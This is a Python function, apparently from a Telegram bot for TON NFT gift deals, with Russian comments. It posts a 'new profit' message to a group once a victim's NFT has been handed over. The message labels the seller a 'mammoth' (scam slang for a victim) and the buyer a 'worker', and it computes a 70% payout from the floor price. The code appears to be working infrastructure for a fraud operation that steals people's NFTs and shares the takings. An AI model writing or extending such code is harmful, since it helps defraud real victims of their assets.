# Функция для отправки лога в группу через 5 минут
async def send_log_to_group(deal_id: str):
    await asyncio.sleep(300)  # 5 минут = 300 секунд
    
    deal = db.get_deal(deal_id)
    if not deal or deal['status'] != DealStatus.NFT_SENT.value:
        return
    
    # Получаем информацию о продавце и покупателе
    seller = db.get_user(deal['creator_id'])
    buyer = db.get_user(deal['buyer_id']) if deal['buyer_id'] else None
    
    if not buyer:
        return
    
    # Получаем флор-цену, если еще не получили
    floor_price = deal.get('floor_price')
    if not floor_price and deal['currency'] == 'TON':
        floor_price = await get_nft_floor_price(deal['description'])
        if floor_price:
            db.update_deal(deal_id, floor_price=floor_price)
    
    # Рассчитываем 70% от суммы (или от флор-цены, если доступна)
    if floor_price and floor_price > 0:
        amount = floor_price
    else:
        amount = deal['amount']
    
    payout_70 = amount * 0.7
    
    # Формируем сообщение для группы (только имя продавца, без @)
    group_message = (
        f"✅ НОВЫЙ ПРОФИТ\n\n"
        f"🤡 Мамонт: {seller['first_name']}\n"
        f"👤 Воркер: @{buyer['username'] if buyer['username'] else 'Неизвестно'}\n"
        f"🎁 Подарок: {deal['description']}\n"
        f"💰 Флор цена: {format_floor_price(floor_price)}\n"
        f"💵 70% выплаты: {payout_70:.2f} TON"
    )
    
    try:
        await bot.send_message(LOG_GROUP_ID, group_message)
        logging.info(f"Log sent to group for deal {deal_id}")
    except Exception as e:
        logging.error(f"Failed to send group message: {e}")

